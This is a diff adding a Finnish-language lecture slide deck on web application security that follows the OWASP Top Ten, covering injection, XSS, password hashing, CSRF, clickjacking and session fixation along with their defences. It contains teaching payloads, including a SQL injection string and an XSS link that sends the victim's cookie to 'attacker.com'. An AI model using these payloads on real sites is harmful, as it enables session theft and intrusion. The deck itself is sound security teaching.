@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>tietoturva</title>
+    
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <link href='http://fonts.googleapis.com/css?family=Bree+Serif' rel='stylesheet' type='text/css'>
+		<link href="../../assets/css/slides.css" rel="stylesheet">
+		<link href="../../assets/css/tamplr.css" rel="stylesheet">
+    <link href="http://fonts.googleapis.com/css?family=Montserrat:400,700" rel="stylesheet" type="text/css">
+    <link href="http://fonts.googleapis.com/css?family=Lato:400,700,400italic,700italic" rel="stylesheet" type="text/css">
+    <script src="http://code.jquery.com/jquery-2.1.3.min.js"></script>
+    <script src="http://gnab.github.io/remark/downloads/remark-latest.min.js"></script>
+    <script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.3.14/angular.min.js"></script>
+  </head>
+  <body>
+    <textarea id="source">class: center, middle
+
+# Tietoturva
+
+.yhdensivunversio[
+[Yhden sivun versio](./all.html)
+]
+
+---
+
+## Tietoturva
+
+* Webissä voi tietoturva olla pielessä monin eri tavoin
+    * Selaimen ja palvelimen välissä on joku nuuskimassa
+    * Selaimessa on korjaamaton tietoturvaongelma
+    * Selaimen liitännäisessä on tietoturvaongelma
+    * Käyttäjän salasana on joutunut vääriin käsiin
+    * Palvelinohjelmistossa on tietoturva-aukko
+    * Web-sovelluksessa on tietoturva-aukko
+    * ...
+
+* Tänään keskitytään siihen, miten web-sovelluksen kehittäjä voi välttää
+  yleisimpiä tietoturvaongelmia
+
+
+
+* Kalvosetti perustuu osittain lähteeseen
+[OWASP Top Ten Project 2013](https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project)
+    * "The OWASP Top Ten represents a broad consensus about what the most critical web application security flaws are."
+
+.footnote[
+<a rel="license" href="http://creativecommons.org/licenses/by/4.0/"><img alt="Creative Commons -lisenssi" style="border-width:0" src="https://i.creativecommons.org/l/by/4.0/88x31.png" /></a>
+]
+
+---
+
+## Injektiohyökkäykset
+
+* Injektiohyökkäykset perustuvat virheisiin käyttäjän syöttämän tiedon
+  käsittelyssä
+
+* Hyökkääjän tavoitteena on
+    * saada oma syöte tulkituksi osaksi ohjelmaa, ja
+    * näin muuttaa ohjelman toimintaa
+
+* Injektiohyökkäys kohdistuu aina tiettyyn järjestelmän osaan
+    * SQL-injektio
+    * NoSQL-injektio
+    * Cross-site Scripting (HTML + JavaScript)
+    * ...
+
+* Samoin hyökkäyksen estäminen, syötteen ja ulostulon käsittely riippuu
+  kohdealueesta
+
+---
+
+## SQL-injektio
+
+* SQL-injektiot olivat pitkään tavanomaisimpia hyökkäyksiä web-palveluja
+  vastaan
+
+* Idea on hyökätä palveluun, joka käyttää SQL-lausekkeiden koostamiseen
+  käyttäjän syötteitä
+    * Arvataan miten lauseke voidaan koostaa ja muodostetaan syötteet
+      niin, että saadaan aikaan haluttu toiminnallisuus
+
+```sql
+var q = "SELECT * FROM users WHERE name = '" + name + "';";
+teeTietokantakysely(q);
+```
+
+Hyökkääjä syöttää käyttäjätunnuksen:
+
+```
+' or 'x' = 'x
+```
+
+jolloin kysely hakee kaikki käyttäjät:
+
+```sql
+SELECT * FROM users WHERE name='' or 'x' = 'x';
+```
+
+---
+
+## [xkcd.com/327](http://xkcd.com/327/)
+
+![](http://imgs.xkcd.com/comics/exploits_of_a_mom.png)
+
+---
+
+## SQL-injektiolta suojautuminen
+
+* Injektiolta voidaan suojautua käsittelemällä kaikki
+  epäluotettavasta lähteestä (mm. käyttäjä) tuleva tieto tarkkaan
+
+* Helpointa on käyttää jotain kirjastoa, joka hoitaa käsittelyn
+    * esim. Sequelize kun käytetään rajapintafunktioita kuten `Model.find()`
+
+* Jos SQL-lauseita täytyy muodostaa käsin, on ainakin kaksi vaihtoehtoa:
+    1. *escape*: muunnetaan syötteen erikoismerkit sellaisiksi, että niitä ei voida
+       tulkita kielen rakenteiksi
+        * Esim. `'` -> `\'` jne.
+    2. *whitelist*: vain tietynlaiset syötteet sallitaan
+        * Esim. käyttäjätunnus saa sisältää vain kirjaimia ja numeroita
+
+* Samat periaatteet pätevät muihinkin injektiohyökkäyksiin
+
+---
+
+## Cross-site Scripting (XSS)
+
+* Cross-site Scripting (XSS) on hyökkäys, jossa ujutetaan ohjelmakoodia
+  (JavaScript) HTML-dokumentin sekaan, jolloin selain suorittaa sen
+    * Eräänlainen injektio siis tämäkin
+
+* Koodi ajetaan selaimen näkökulmasta kohdepalvelun kontekstissa
+    * Selain tulkitsee koodin olevan peräisin samasta *originista* kuin
+      kohdepalvelu
+    * Tällöin hyökkääjän koodi voi mm. tehdä Ajax-kutsuja
+      kohdepalveluun, käsitellä evästeitä, muokata sivua, jne.
+
+* XSS-hyökkäykset voidaan jakaa
+    * pysyviin (persistent)
+    * ei-pysyviin
+
+---
+
+## Pysyvä XSS
+
+* Pysyvässä XSS-hyökkäyksessä hyökkääjä
+    * tallentaa web-sovelluksen tietokantaan koodin, jonka haluaa
+      injektoida
+    * ja järjestää niin, että ko. koodi suoritetaan käyttäjän
+      selaimessa
+
+* Esimerkiksi jos keskustelupalsta ei ole suojautunut XSS-hyökkäyksiä
+  vastaan voisi hyökkääjä kirjoittaa viestin
+```html
+<script>alert("böö");</script>
+```
+jolloin se tallentuu palvelimelle ja skripti suoritetaan aina kun joku käyttäjä lataa viestin selaimellaan
+
+---
+
+## Ei-pysyvä XSS
+
+* Ei-pysyvässä XSS-hyökkäyksessä koodi ei tallennu pysyvästi
+  tietokantaan
+
+* Hyökkääjä käyttää hyväkseen jotain sellaista syötettä
+    * jota palvelin käyttää sivun luontiin
+    * jonka käsittely (erikoismerkit) ei toimi, jolloin
+    * tulossivuun päästään lisäämään haluttu koodi
+
+* Esimerkiksi, sivuston hauissa käytetään query-parametria `q`, jota ei
+  tarkisteta kunnolla, mutta käytetään sivun generoinnissa. Hyökkääjä voi nyt jakaa seuraavan linkin uhrilleen:
+
+```html
+http://example.com/search.php?
+q=<script>document.location=
+'http://attacker.com/cookiesteal?'
++document.cookie</script>
+```
+
+---
+
+## Ei-pysyvä, DOM-pohjainen XSS
+
+* Myös selainpään DOM-manipulointi voi olla altis XSS-hyökkäyksille
+
+* Esim. sivu osoitteessa `example.com` lukee käyttäjän nimen URL-parametrista ja lisää sen
+  DOM:iin
+
+```javascript
+var pos = document.URL.indexOf("name=");
+var name = decodeURIComponent(document.URL.substr(pos+5));
+document.write(name);
+```
+
+Hyökkääjä voi antaa uhrilleen seuraavan URL:n
+```http
+http://example.com/?name=<script>alert("böö");</script>
+```
+
+---
+
+## XSS:ltä suojautuminen
+
+* XSS:ltä suojautuakseen täytyy huomata, että eri HTML-dokumentin osat
+  noudattavat erilaisia jäsennyssääntöjä
+    * Myös niihin lisättävää epäluotettavaa dataa on kohdeltava eri
+      tavoin
+
+* Tavallisin tapaus: epäluotettavan datan lisääminen elementin sisään (`<body>`,
+  `<div>`, `<p>`, ...):
+    * Riittää
+["entity-enkoodata"](http://www.w3schools.com/html/html_entities.asp) merkit `&`, `<`, `>`, `"`, `'`, `/`
+    * Esim. `&` muotoon `&amp;amp;` ja `<` muotoon `&amp;lt;` jne.
+    * EJS-sivupohjamoottorin `<%= muuttuja %>` tekee tämän
+
+* Attribuutit, esim `<div class="<%= luokka %>">`
+    * Jos attribuutit on aina ympäröity lainausmerkein, riittää
+      enkoodata `"`
+    * Jos ei, täytyy enkoodata [paljon muutakin](https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet#RULE_.232_-_Attribute_Escape_Before_Inserting_Untrusted_Data_into_HTML_Common_Attributes)
+    * Erikoisattribuutit `href`, `src`, `style` ja tapahtumankäsittelijät (esim. `onmouseover`)
+      ovat vaikeampia
+
+* [XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet)
+kertoo tarkemmin
+
+---
+
+## Salasanojen tallentaminen
+
+* Tietovuodon aiheuttamia vahinkoja voi pienentää salakirjoittamalla
+  tietokantaan tallennettu sensitiivinen data
+
+* Mikäli mahdollista kannattaa käyttää yksisuuntaista
+  tiivistefunktiota (hash function)
+    * Mm. salasanojen tapauksessa näin kannattaa ~aina tehdä
+    * Tällöin web-sovelluksen ylläpitäjäkään ei voi saada selville
+      käyttäjien salasanoja
+
+* Toiminta:
+    1. Tallennetaan selväkielisen salasanan sijaan sen *tiiviste* (*hash*)
+    2. Aina salasanaa tarkastettaessa lasketaan tiiviste
+        * ja verrataan tätä tietokantaan tallennettuun tiivisteeseen
+
+
+---
+
+
+## Salasanojen tallentaminen
+
+![](../img/hashpass.png)
+
+---
+
+## Tiivistefunktio
+
+* Tiivistefunktion on oltava sellainen, että
+    * tiivisteestä ei saa selville alkuperäistä syötettä
+        * muuta kuin *brute force* -metodilla joka kestää astronomisen
+          kauan
+    * *törmäyksiä* (*hash collision*) ei tapahdu
+         * törmäys = kaksi eri syötettä tuottaa saman tiivisteen
+
+* Esimerkiksi *SHA256*-funktio täyttää nämä ehdot
+    * (Luultavasti. Ei ole olemassa tiivistefunktiota joka
+      *todistetusti* täyttäisi ehdot.)
+
+```javascript
+var crypto = require('crypto');
+var sha256 = crypto.createHash('sha256');
+sha256.update('salasana').digest('base64');
+```
+
+```javascript
+'B1pCGgH+SYS0reSomv7IYfmkNfVLW87W0KDlqHkuUhw='
+```
+---
+
+## Sanakirjahyökkäys
+
+* Tiivistealgoritmit ovat deterministisiä
+    * Sama salasana tuottaa aina saman tiivisteen
+
+* Vuodetuista salasanojen tiivisteistä on helppo saada yleisimmät salasanat selville ns.  *sanakirjahyökkäyksellä*
+    * Sanakirjahyökkäyksessä lasketaan yleisempien salasanojen (esim.
+      kaikki suomen tai englannin sanat) tiivisteet
+    * ja katsotaan löytyykö näitä tiivisteitä vuodetusta salasanatietokannasta
+
+* Tiivisteet voidaan laskea ennakkoon
+    * Tähän tarkoitukseen käytetään usein
+      [*rainbow table*](http://kestas.kuliukas.com/RainbowTables/)
+      -tietorakennetta
+        * Paljon salasana-tiiviste-pareja voidaan tallentaa tiiviisti
+        * Ns. rainbow table attack
+
+* Sanakirjahyökkäys voidaan estää lisäämällä salasanaan suola, salt ->
+
+---
+
+## Salasanojen tallentaminen: suola
+
+* Sanakirjahyökkäys voidaan estää lisäämällä salasanaan *suola*, *salt*
+
+* Suola on satunnainen merkkijono, joka luodaan salasanan luonnin yhteydessä
+
+* Suola lisätään salasanaan aina tiivistettä laskettaessa
+
+```nohighlight
+H = Hash(password + salt)
+```
+
+* Kuhunkin tiivisteeseen liittyvä suola on myös tallennettava tietokantaan
+    * Tarvitaan salasanaa tarkastettaessa
+
+---
+
+## Salasanojen tallentaminen: suola
+
+![](../img/hashpasssalt.png)
+
+---
+
+## Scrypt
+
+* Helpoiten salasanojen turvallinen tallentaminen onnistunee käyttäen
+  jotain [key derivation -funktiota](http://en.wikipedia.org/wiki/Key_derivation_function),
+  joka laskee tiivisteen ja lisää suolan automaattisesti
+    * Esim. [Scrypt](http://en.wikipedia.org/wiki/Scrypt)
+
+* Node.js:ssä voi käyttää pakettia [scrypt](https://github.com/barrysteyn/node-scrypt)
+
+
+```javascript
+var scrypt = require('scrypt');
+
+scrypt.hash.config.keyEncoding = 'utf8';
+scrypt.hash.config.outputEncoding = 'base64';
+scrypt.verify.config.keyEncoding = 'utf8';
+scrypt.verify.config.hashEncoding = 'base64';
+
+var h = scrypt.hash('SaLa123', scrypt.params(0.1));
+
+console.log("Hash: " + h);
+
+scrypt.verify(h, 'SaLa123', function(err, result) {
+  console.log("Salasana oikein? - " + result);
+});
+```
+
+---
+
+## Cross-site Request Forgery (CSRF)
+
+* CSRF-hyökkäyksessä hyökkääjä saa uhrin selaimen lähettämään
+  HTTP-pyynnön hyökkääjän haluamaan kohdepalveluun
+
+* Hyökkäys käyttää hyväkseen selaimen ja kohdepalvelun välistä
+  tilatietoa
+    * Esim. evästeessä oleva istuntotunniste, joka lähetetään pyynnön
+      mukana
+
+* Hyökkäys perustuu pyynnön sivuvaikutuksiin
+    * Hyökkääjä ei (yleensä) näe pyynnön vastausta
+
+---
+
+## CSRF-esimerkki 1
+
+* Osoitteessa `http://pahis.org` on seuraava HTML:
+
+```html
+<img src="https://pankki.fi/tyhjennaTili" alt="kuva" />
+```
+
+* Kuvaa ladatessaan käyttäjän selain tekee HTTP GET-pyynnön kohteeseen `pankki.fi`
+    * Mukana kulkee myös mahdolliset `pankki.fi`-sivuston evästeet,
+      mm. istuntotunniste
+
+* Jos GET-pyynnöllä on sivuvaikutuksia, suoritetaan ne palvelimella
+
+* Oikein toteutetulla GET-pyynnön käsittelyllähän ei pitäisi olla
+  sivuvaikutuksia, jolloin tämä hyökkäys ei toimi!
+
+---
+
+## CSRF-esimerkki 2
+
+* Osoitteessa `http://pahis.org` on seuraava lomake, joka käyttäjä
+  huijataan lähettämään
+
+```html
+<form action="https://pankki.fi/tyhjennaTili" method="POST">
+  <input type="submit" value="Katso kissavideo">
+</form>
+```
+
+* `POST`-pyynnöllä voi olla sivuvaikutuksia, joten tältä suojautumiseen
+  pelkkä HTTP-protokollan noudattaminen ei riitä
+
+* `PUT`, `DELETE` tai monimutkaisempia `POST`-pyyntöjä toisiin
+  *origineihin* ei oletuksena tehdä suoraan vaan tarvitaan
+    [preflight-vaihe](../asiakaspalvelin/#26)
+    * Tällöin ei CSRF myöskään onnistu
+
+---
+
+## CSRF:ltä suojautuminen
+
+* CSRF:n kannalta oleellisia ovat pyynnöt...
+    1. joilla on sivuvaikutuksia
+    2. ja joita voidaan tehdä muista origineista
+
+* CSRF voidaan estää vaatimalla pyynnössä salainen merkkijono,
+  *CSRF token*, esimerkiksi HTTP-viestin rungossa
+    * CSRF token annetaan niille tahoille, joilla on oikeus tehdä pyyntö
+    * Esim. generoitavan HTML-sivun lomakkeen piilotetussa kentässä
+```html
+<form ...>
+  <input type="hidden" name="_csrf" value="fj93jf89fjaw89f">
+  ...
+</form>
+```
+
+* Toinen tapa on tarkastella `Referer` HTTP-otsikkokenttää
+    * Ei ihan yhtä hyvä tapa: sivustolla X voi olla haavoittuvuus, jolla
+      hyökkääjä pystyy luomaan uudelleenohjauksen, jolloin
+`Referer: X`
+
+---
+
+## CSRF:ltä suojautuminen: Node.js
+
+* Node.js + Expressin kanssa voidaan käyttää vaikkapa pakettia
+[`csurf`](https://github.com/expressjs/csurf)
+
+* Middleware generoi ja tarkistaa CSRF tokenin
+
+```javascript
+var csrf = require('csurf');
+...
+var csrfProtection = csrf();
+app.get('/', csrfProtection, function(req,res) {
+  res.render('etusivu', {csrfToken: req.csrfToken()});
+} );
+app.post('/tyhjennaTili', csrfProtection, function(req, res) {
+  ...
+});
+```
+
+* etusivu.ejs
+
+```html
+<form action="/tyhjennaTili" method="post">
+  <input type="hidden" name="_csrf" value="<%= csrfToken %>"/>
+  <input type="submit" value="Tyhjennä tili"/>
+</form>
+```
+
+---
+
+## Clickjacking
+
+* *Clickjacking* (*UI redressing*) -hyökkäyksessä hyökkääjä luo
+  sivuston, jonka käyttöliittymä hämää käyttäjän tekemään (usein
+klikkaamaan) jossain toisessa web-sivustossa jotain jota hänen ei ollut
+tarkoitus
+
+* Esim. hyökkääjä haluaa sivulleen Facebook-tykkäyksiä
+    * Hyökkääjä luo kiltin näköisen sivun
+    * Lisää sinne Facebook-tykkäysnapin
+    * Luo tykkäysnapin päälle HTML-elementin
+        * esim. videon play-painike
+    * Käyttäjä luulee klikkaavansa play-painiketta, mutta oikeasti
+      klikkaus kohdistuu tykkäysnappiin
+
+* Paljon erilaisia variaatioita: tykkäysnappi voidaan tehdä
+  näkymättömäksi, liikuttaa automaattisesti kursorin mukana, jne.
+
+* Usein hyökkäys toteutetaan upottamalla klikkauksen kohde `<iframe>`-elementin sisään
+    * Oletuksena minkä tahansa sivuston voi lisätä `<iframe>`:een
+
+---
+
+## Clickjackingilta suojautuminen
+
+* Perustapauksessa voidaan kieltää sivuston näyttäminen
+  `<iframe>`-elementissä
+    * Onnistuu [`X-Frame-Options`](https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options) -HTTP-otsikolla, esim.
+```http
+X-Frame-Options: DENY
+```
+    * Nykyään suositeltavin tapa lienee käyttää
+[`Content-Security-Policy`](https://developer.mozilla.org/en-US/docs/Web/Security/CSP)-otsikon
+[`frame-ancestors`](https://developer.mozilla.org/en-US/docs/Web/Security/CSP/CSP_policy_directives#frame-ancestors)-direktiiviä, esim.
+```http
+Content-Security-Policy: frame-ancestors
+```
+
+* Jos halutaan sallia sivuston liittäminen osaksi mitä tahansa muuta
+  sivustoa (esim. tykkäysnappi), clickjackingin estäminen menee huomattavasti
+hankalammaksi...
+    * Yksi tapa on avata klikkauksen jälkeen uusi selainikkuna,
+      jossa kysytään vahvistus käyttäjältä
+
+---
+
+## Session Fixation
+
+* [Session fixation](https://www.owasp.org/index.php/Session_fixation) -hyökkäyksessä
+hyökkääjä houkuttelee uhrin käyttämään hyökkääjän tuntemaa istuntotunnistetta
+
+* Esim.
+    1. Hyökkääjä luo kohdepalvelussa istuntotunnisteen
+    2. Hyökkääjä saa uhrin käyttämään tätä istuntotunnistetta
+        * Esim 1. antamalla tälle linkin
+          `http://example.com/?SID=HYOKKAAJAN_SID`
+        * Esim 2. `pahis.herokuapp.com` saa asettaa evästeen domainille
+          `herokuapp.com`, jolloin se (SID=HYOKKAAJAN_SID) lähetetään
+myös domainiin `kohdepalvelu.herokuapp.com`
+    3. Uhri kirjautuu sisään käyttäen hyökkääjän antamaa
+      istuntotunnistetta
+    4. Nyt hyökkäjä voi ottaa haltuunsa uhrin istunnon
+
+* Estäminen: luodaan uusi istuntotunniste käyttäjän kirjautuessa
+    * Express: `req.session.regenerate(function(err) {})`
+
+---
+
+## OWASP Top Ten (A1-A4)
+
+[OWASPTop10](http://owasptop10.googlecode.com/files/OWASP%20Top%2010%20-%202013.pdf):
+merkittävimmät web-sovellusten tietoturvaongelmat
+
+* A1:  Injection
+
+* A2: Broken Authentication and Session Management
+    * Autentikointi- tai istuntotiedot (salasana, istuntotunniste, ...)
+      päätyvät vääriin käsiin
+    * Syitä voi olla monia. Esim. salaamaton HTTP-yhteys, *session fixation*, ...
+
+* A3: Cross-Site Scripting (XSS)
+
+* A4: Insecure Direct Object References
+    * Suorat, autentikoimattomat viittaukset olioihin
+    * Esim. Teemun salaiset tiedot saa osoitteesta
+      `https://example.com/teemu/tiedot`
+        * Hyökkääjän helppo arvata, että Ahton tiedot saa osoitteesta
+          `https://example.com/ahto/tiedot`
+    * Estäminen: *Jokaisen* resurssin autentikointi pitää olla kunnossa
+
+---
+
+## OWASP Top Ten (A5-A6)
+
+* A5: Security Misconfiguration
+    * Palvelimella on konfiguraatiosta johtuva tietoturva-aukko
+    * Estäminen: kaikki ohjelmiston osat konfiguroitu oikein
+        * Ei oletussalasanoja, turvattomia oletusasetuksia, stack
+          traceja näkyville, jne.
+        * Sama konfiguraatio kehitys-, QA- ja tuotantoympäristössä
+        * Prosessi, joka mahdollistaa tietoturvakorjausten julkaisemisen
+          nopeasti
+
+* A6: Sensitive Data Exposure
+    * Sensitiivisen datan paljastuminen
+    * Estäminen:
+        * Älä säilö sensitiivistä dataa turhaan, esim. logeissa
+        * Salakirjoita sensitiivinen data
+        * Käytä hyväksihavaittuja salakirjoitusteknologioita
+
+---
+
+## OWASP Top Ten (A7-A10)
+
+* A7: Missing Function Level Access Control
+    * Samoin kuin datan (A4), täytyy toimintojenkin autentikointi olla
+      kunnossa
+
+* A8: Cross-Site Request Forgery (CSRF)
+
+* A9: Using Components with Known Vulnerabilities
+    * Käytetään komponenttia jossa on tunnettu haavoittuvuus
+    * Estäminen: web-palvelimen ylläpitäjän pitää seurata uutisia
+      käytetyistä komponenteista löytyvistä tietoturvaongelmista ja
+asentaa korjaukset nopeasti
+        * tai luopua haavoittuvaisen komponentin käytöstä
+
+* A10: Unvalidated Redirects and Forwards
+    * Tarkistamattomat uudelleenohjaukset
+    * Esim. `http://example.com/redirect.jsp?url=evil.com`
+
+
+---
+
+## OWASP Top Ten
+
+![](../img/owasptop10.png)
+
+
+---
+
+## Yhteenveto
+
+* Käytiin läpi muutama tietoturvaongelma
+    * Injektiot (ml. XSS)
+    * CSRF
+    * Clickjacking
+    * ym.
+
+* Nämä eivät kuitenkaan kata kuin pienen osan mahdollisista
+  tietoturvaongelmista
+    * Erilaisia mahdollisia tietoturva-aukkoja on ~rajattomasti
+
+</textarea>
+    <script>
+      "use strict";
+      $(document).ready(function() {
+        remark.create();
+      });
+    </script>
+  </body>
+</html>
+
